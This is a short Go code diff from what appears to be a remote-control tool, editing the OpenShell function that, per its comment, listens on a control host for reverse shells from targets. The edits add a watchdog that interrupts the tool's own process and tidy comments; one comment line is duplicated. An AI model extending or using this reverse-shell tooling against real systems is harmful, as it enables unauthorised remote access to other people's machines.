@@ -111,6 +111,7 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
 // OpenShell opens a listener on the control host for a reverse shell from the target
+// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
@@ -132,7 +133,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		return fmt.Errorf("invalid -subnet: %w", err)
 	}
 
-	// FIXED: Use the pool's gateway IP as the VirtualIP, NOT the local host adapter IP
 	virtualIP := pool.Addr()
 
 	addr := network.LocalIP().IP
@@ -197,7 +197,7 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 
 	done := make(chan struct{})
 
-	// FIXED: Explicitly force close the socket if local Ctrl+C hits to unblock io.Copy on FreeBSD
+	// Force close the socket if local Ctrl+C hits to unblock io.Copy
 	go func() {
 		select {
 		case <-ctx.Done():
@@ -213,7 +213,17 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		close(done)
 	}()
 
-	// FIXED: Protect against FreeBSD terminal hangs by checking context state inside keyboard loop
+	// FIXED: Watchdog to force break the blocking os.Stdin.Read loop on FreeBSD when target exits
+	go func() {
+		<-done
+		// Find our own process and deliver a SIGINT to trigger the signal context shutdown
+		p, err := os.FindProcess(os.Getpid())
+		if err == nil {
+			_ = p.Signal(os.Interrupt)
+		}
+	}()
+
+	// Stream keyboard straight into the connection
 	go func() {
 		buf := make([]byte, 1024)
 		for {
